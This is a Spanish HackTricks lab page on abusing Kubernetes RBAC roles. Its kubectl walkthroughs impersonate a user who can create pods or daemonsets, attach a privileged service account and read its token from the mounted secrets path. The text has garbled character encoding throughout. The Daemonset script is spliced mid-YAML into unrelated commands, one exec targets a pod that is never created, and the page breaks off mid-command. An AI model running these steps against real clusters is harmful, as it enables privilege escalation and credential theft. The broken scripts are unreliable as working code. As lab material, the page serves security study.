# Kubernetes Roles Abuse Lab

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Puedes ejecutar estos laboratorios dentro de **minikube**.

## Creaci√≥n de Pod -> Escalada a ns SAs

Vamos a crear:

* Una **cuenta de servicio "test-sa"** con un privilegio de cl√∫ster para **leer secretos**
  * Se crear√° un ClusterRole "test-cr" y un ClusterRoleBinding "test-crb"
* Se dar√°n **permisos** para listar y **crear** pods a un usuario llamado "**Test**"
  * Se crear√° un Role "test-r" y un RoleBinding "test-rb"
* Luego **confirmaremos** que el SA puede listar secretos y que el usuario Test puede listar pods
* Finalmente, **suplantaremos al usuario Test** para **crear un pod** que incluya el **SA test-sa** y **robar** el **token de la cuenta de servicio**.
  * Esta es la forma de mostrar que el usuario podr√≠a escalar privilegios de esta manera.

{% hint style="info" %}
Para crear el escenario se utiliza una cuenta de administrador.\
Adem√°s, para **exfiltrar el token de la cuenta de servicio** en este ejemplo se utiliza la **cuenta de administrador** para ejecutar dentro del pod creado. Sin embargo, **como se explica aqu√≠**, la **declaraci√≥n del pod podr√≠a contener la exfiltraci√≥n del token**, por lo que el privilegio "exec" no es necesario para exfiltrar el token, el **permiso "create" es suficiente**.
{% endhint %}

```bash
# Crear cuenta de servicio test-sa
# Crear rol y vinculaci√≥n de roles para dar permisos de lista y creaci√≥n sobre pods en el espacio de nombres predeterminado al usuario Test
# Crear clusterrole y clusterrolebinding para dar acceso al SA test-sa a los secretos en todas partes

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb
subjects:
  - kind: ServiceAccount
    name: test-sa
  - kind: User
    name: Test
roleRef:
  kind: Role
  name: test-r
  apiGroup: rbac.authorization.k8s.io
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-cr
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: test-crb
subjects:
  - kind: ServiceAccount
    namespace: default
    name: test-sa
    apiGroup: ""
roleRef:
  kind: ClusterRole
  name: test-cr
  apiGroup: rbac.authorization.k8s.io' | kubectl apply -f -

# Comprobar que test-sa puede acceder a los secretos de kube-system
kubectl --as system:serviceaccount:default:test-sa -n kube-system get secrets

# Comprobar que el usuario Test puede obtener pods en el espacio de nombres predeterminado
kubectl --as Test -n default get pods

# Crear un pod como usuario Test con el SA test-sa (paso de escalada de privilegios)
echo "apiVersion: v1
kind: Pod
metadata:
  name: test-pod
  namespace: default
spec:
  containers:
  - name: alpine
    image: alpine
    command: ['/bin/sh']
    args: ['-c', 'sleep 100000']
  serviceAccountName: test-sa
  automountServiceAccountToken: true
  hostNetwork: true"| kubectl --as Test apply -f -

# Con√©ctese al pod creado y confirme que el token de la cuenta de servicio adjunto pertenece a test-sa
kubectl exec -ti -n default test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Limpiar el escenario
kubectl delete pod test-pod
kubectl delete clusterrolebinding test-crb
kubectl delete clusterrole test-cr
kubectl delete rolebinding test-rb
kubectl delete role test-r
kubectl delete serviceaccount test-sa
```

## Crear Daemonset

```bash
# Crear cuenta de servicio test-sa
# Crear rol y vinculaci√≥n de roles para dar permisos de lista y creaci√≥n sobre daemonsets en el espacio de nombres predeterminado al usuario Test
# Crear clusterrole y clusterrolebinding para dar acceso al SA test-sa a los secretos en todas partes

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r
rules:
  - apiGroups: ["apps"]
    resources: ["daemonsets"]
    verbs: ["get", "list", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb
subjects:
  - kind: User
    name: Test
# Comprobar que el usuario Test puede obtener los pods en el namespace default
kubectl --as Test -n default get daemonsets

# Crear un daemonset como usuario Test con el SA test-sa (paso de escalada de privilegios)
echo "apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: alpine
  namespace: default
spec:
  selector:
    matchLabels:
      name: alpine
  template:
    metadata:
      labels:
        name: alpine
    spec:
      serviceAccountName: test-sa
      automountServiceAccountToken: true
      hostNetwork: true
      containers:
      - name: alpine
        image: alpine
        command: ['/bin/sh']
        args: ['-c', 'sleep 100000']"| kubectl --as Test apply -f -

# Con√©ctese al pod creado y confirme que el token SA adjunto pertenece a test-sa
kubectl exec -ti -n default daemonset.apps/alpine -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Limpiar el escenario
kubectl delete daemonset alpine
kubectl delete clusterrolebinding test-crb
kubectl delete clusterrole test-cr
kubectl delete rolebinding test-rb
kubectl delete role test-r
kubectl delete serviceaccount test-sa
```

## No funciona

### Crear/Modificar Bindings

**No funciona:**

* **Crear un nuevo RoleBinding** solo con el verbo **create**
* **Crear un nuevo RoleBinding** solo con el verbo **patch** (necesita tener permisos de binding)
  * No se puede hacer esto para asignar el rol a s√≠ mismo o a un SA diferente
* **Modificar un nuevo RoleBinding** solo con el verbo **patch** (necesita tener permisos de binding)
  * No se puede hacer esto para asignar el rol a s√≠ mismo o a un SA diferente

```bash
echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa2
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["rolebindings"]
    verbs: ["get", "patch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb
subjects:
  - kind: User
    name: Test
roleRef:
  kind: Role
  name: test-r
  apiGroup: rbac.authorization.k8s.io
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r2
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb2
subjects:
  - kind: ServiceAccount
    name: test-sa
    apiGroup: ""
roleRef:
  kind: Role
  name: test-r2
  apiGroup: rbac.authorization.k8s.io' | kubectl apply -f -

# Crear un pod como usuario Test con el SA test-sa (paso de escalada de privilegios)
echo "apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-r2
subjects:
  - kind: ServiceAccount
    name: test-sa2
    apiGroup: ""
roleRef:
  kind: Role
  name: test-r2
  apiGroup: rbac.authorization.k8s.io"| kubectl --as Test apply -f -

# Con√©ctese al pod creado y confirme que el token SA adjunto pertenece a test-sa
kubectl exec -ti -n default test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Limpiar el escenario
kubectl delete rolebinding test-rb
kubectl delete rolebinding test-rb2
kubectl delete role test-r
kubectl delete role test-r2
kubectl delete serviceaccount test-sa
kubectl delete serviceaccount test-sa2
```

### Bindings expl√≠citos

En la secci√≥n "Prevenci√≥n de la escalada de privilegios y arranque" de [https://unofficial-kubernetes.readthedocs.io/en/latest/admin/authorization/rbac/](https://unofficial-kubernetes.readthedocs.io/en/latest/admin/authorization/rbac/) se menciona que si un SA puede crear un Binding y tiene permisos expl√≠citos de Binding sobre el Rol/ClusterRole, puede crear Bindings incluso usando Roles/ClusterRoles con permisos que no tiene.\
Sin embargo, no funcion√≥ para m√≠:

```yaml
# Crear 2 SAs, darle a uno de ellos permisos para crear clusterrolebindings
# y permisos de binding sobre el ClusterRole "admin"
echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa2
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-cr
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["clusterrolebindings"]
    verbs: ["get", "create"]
  - apiGroups: ["rbac.authorization.k8s.io/v1"]
    resources: ["clusterroles"]
    verbs: ["bind"]
    resourceNames: ["admin"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: test-crb
subjects:
  - kind: ServiceAccount
    name: test-sa
    namespace: default
roleRef:
  kind: ClusterRole
  name: test-cr
  apiGroup: rbac.authorization.k8s.io
' | kubectl apply -f -

# Intentar vincular el ClusterRole "admin" con el segundo SA (no funcionar√°)
echo 'apiVersion: rbac.authorization.k8s